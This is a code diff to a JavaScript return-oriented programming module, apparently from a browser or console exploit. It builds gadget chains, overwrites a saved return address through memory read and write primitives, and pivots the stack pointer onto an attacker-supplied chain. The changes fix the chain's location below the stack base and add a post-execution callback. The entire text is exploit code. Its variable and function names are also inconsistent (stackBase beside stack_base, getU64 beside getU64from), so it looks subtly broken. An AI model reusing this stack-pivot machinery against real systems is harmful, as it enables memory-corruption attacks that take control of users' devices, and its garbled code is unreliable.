@@ -27,9 +27,10 @@ function gadget(instructions, module, address) {
 	}
 }
 
-function rop(chainAddress) {
+function rop() {
 	var resp = getU64(stackBase + returnAddress);
-	var chainAddress = chainAddress;
+	this.data = stack_base + return_va + 0x420;
+	var chainAddress = stack_base - 0x20000;
 	var chainLength = 0;
 	var variableAddresses = [];
 	
@@ -100,7 +101,7 @@ function rop(chainAddress) {
 		return valueAddress;
 	}
 	
-	this.execute = function() {
+	this.execute = function(afterExecution) {
 		// Restore Stack Pointer
 		this.add("pop rax", resp);
 		this.write_rax(stackBase + returnAddress);
@@ -111,6 +112,10 @@ function rop(chainAddress) {
 		// Redirect Stack Pointer to our ROP chain
 		setU64(stackBase + returnAddress, gadgets["pop rsp"].address());
 		setU64(stackBase + returnAddress + 8, chainAddress);
+		
+		setTimeout(function() {
+			if(afterExecution) afterExecution();
+		}, 1);
 	}
 	
 	// Don't yet know where to store variables (depends on chainLength)
@@ -126,9 +131,7 @@ function rop(chainAddress) {
 		}
 	}
 	
-	this.logVariable = function(n) {
-		var v = getU64(chainAddress + chainLength + n * 8);
-		var s = "Variable " + n.toString() + " = 0x" + v.toString(16);
-		console.log(s);
+	this.getVariable = function(n) {
+		return getU64from(chainAddress + chainLength + n * 8);
 	}
 }
